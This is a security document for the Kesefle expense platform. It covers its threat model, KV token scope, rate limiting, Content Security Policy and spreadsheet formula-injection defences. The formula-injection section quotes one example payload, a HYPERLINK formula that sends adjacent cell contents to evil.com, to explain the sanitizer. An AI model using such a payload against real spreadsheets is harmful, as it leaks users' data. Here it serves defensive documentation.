# Kesefle Security

## Overview

This document captures the operational security posture for the Kesefle platform — the
Vercel serverless API, the Apps Script bot, and the data they share via Vercel KV
(Upstash Redis). It complements the deeper material in `docs/security/`.

The threat model assumes an attacker who can: (a) send arbitrary requests to public
endpoints, (b) send arbitrary WhatsApp messages to the bot number, and (c) read any
data the user themselves writes back to their own Google Sheet. Out of scope: a
compromised Vercel project secret store, a compromised Google account.

## Vercel KV token scope

The Vercel KV token must be restricted to the following key prefixes:

- `rate:*`
- `token:*`
- `family:*`
- `sub:*`
- `phone:*`

Permissions: `GET`, `SET`, `DEL`, `INCR`, `EXPIRE`.

If Upstash adds prefix-scoped tokens, the production token must be replaced with one
that holds only those scopes. The current token is full-access; this is tracked as a
follow-up. Until then, treat the KV token as a tier-1 secret on par with
`GOOGLE_CLIENT_SECRET`.

## Rate limiting

Two layers run in front of public endpoints:

1. **Inline per-IP guard** — `api/_lib/rateLimit.js` extracts the client IP from
   `x-forwarded-for` (first hop) or `x-real-ip`, increments `rate:<ip>` in KV with a
   60-second TTL, and returns a 429 if the count exceeds 30 in that window. Skipped
   for `/api/health` and `/api/_internal*`. Fails open on KV outage so an Upstash
   incident does not cause a site-wide outage.
2. **Per-endpoint, per-action wrapper** — `lib/ratelimit.js` is used by routes that
   need finer-grained control (e.g. 10 OAuth code exchanges per IP per hour, 5 sheet
   provisions per user per hour). Both layers coexist; the inline guard is the cheap
   first line, the wrapper layer expresses business-rule limits.

Currently applied inline on: `api/auth/google.js`, `api/events.js`. Apply to any new
public endpoint by importing `rateLimit` from `../_lib/rateLimit.js` (or as many `..`
hops as required) and calling `if (await rateLimit(req, res)) return;` as the first
line of the handler.

## CSP

The site-wide Content Security Policy is set in `vercel.json` under the global
`/(.*)` headers block. The policy intentionally allows the following remote origins:

- `script-src`: `https://apis.google.com` (Google Identity Services, Picker),
  `https://cdn.jsdelivr.net` (libraries), `https://cdn.tailwindcss.com` (utility CSS
  runtime), `https://accounts.google.com` (OAuth chooser), plus
  `https://connect.facebook.net` and `https://appleid.cdn-apple.com` for the social
  sign-in scripts on `/account`.
- `style-src`: `https://fonts.googleapis.com`, `https://cdn.jsdelivr.net`,
  `https://cdn.tailwindcss.com`. `'unsafe-inline'` is required because the site uses
  inline `style="..."` attributes throughout the marketing pages and Tailwind's
  runtime injects inline `<style>` blocks.
- `connect-src`: `https://sheets.googleapis.com`, `https://oauth2.googleapis.com`,
  `https://accounts.google.com`, `https://www.googleapis.com`. The first two are the
  only ones the dashboard actually calls; the second two are Google's broader OAuth
  surface.
- `frame-src`: `https://accounts.google.com` only.
- `frame-ancestors 'none'` — Kesefle pages can never be embedded.

Headers set alongside the CSP: `X-Frame-Options: DENY`,
`X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`,
`Permissions-Policy: camera=(), microphone=(), geolocation=(), interest-cohort=()`,
`Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`.

`'unsafe-inline'` for scripts is a known weakening. Removing it would require auditing
every inline `<script>` block on every page and either externalizing or nonce-ing
them. Tracked as a follow-up.

## Formula injection

The bot writes user-supplied text into Google Sheets. Sheets evaluates any cell whose
value begins with `=`, `+`, `-`, `@`, or a tab character as a formula. A
maliciously-crafted WhatsApp message like `=HYPERLINK("https://evil.com?d="&A1, "click")`
would, if written raw, exfiltrate adjacent cells the first time the sheet is opened.

Mitigation: every user-typed string passes through `sanitizeForSheet()` (defined near
the top of `bot/ExpenseBot_FIXED.gs`) before it lands in `appendRow()` / `setValue()`
/ `setValues()`. The helper prepends a single quote `'` if the first character is one
of the dangerous five; non-strings (numbers, dates, booleans) pass through untouched
because they never go through formula parsing.

Applied at all write sites in `ExpenseBot_FIXED.gs`:
- `processExpense()` and the interactive-reply path (description, category, subcategory).
- `_learnedSave()` (learned keyword + category mappings).
- `migrateLegacyDashboardValues()` (section names and labels read from the
  pre-existing dashboard).
- `migrateSubcategoriesAndCategories()` (cells being rewritten in-place).

Static header rows like `['keyword', 'category', 'subcategory', 'source',
'updated_at']` are not sanitized because they are compile-time literals.
